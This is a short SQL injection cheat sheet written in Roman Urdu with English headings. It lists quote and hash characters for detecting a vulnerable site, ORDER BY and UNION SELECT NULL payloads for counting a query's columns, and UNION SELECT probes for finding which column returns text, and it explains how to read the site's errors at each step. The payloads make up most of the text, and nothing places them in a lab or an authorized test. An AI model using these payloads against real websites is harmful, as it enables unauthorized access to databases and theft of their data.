### Basic payload for checking website is vulnerable or not

 `'`

 `"`

 `#` 

---

### Checking How many Columns

` ' ORDER BY 1--`

` ' ORDER BY 2--`

` ' ORDER BY 3--`

Jahan pr website main error ajaye jaisy ` ' ORDER BY 3--` pr too iska matlab 2 columns hain.

### Alternative Method for Checking Columns

` ' UNION SELECT NULL-- `

` ' UNION SELECT NULL,NULL-- `

` ' UNION SELECT NULL,NULL,NULL-- `

Agar ` ' UNION SELECT NULL,NULL-- ` aany pr website py yeh display hoo jaye or baki dono pr error aye too phir yani 2 columns hain.

---

### Checking which column contain text data

` ' UNION SELECT "abc",NULL,NULL-- `

` ' UNION SELECT NULL,"abc",NULL-- `

` ' UNION SELECT NULL,NULL,"abc"-- `

Jab yeh pata chal jaye ky website main kitny columns hain too iusky baad ka step yeh check krna hota hai ky kis column main text data jaa rha hai isky liye yeh oper wali sub combinations try ki ati hain jis combination pr error na aye yani iusky andar text data jaa rha hai or iusi column sy hum data retrive krty hain.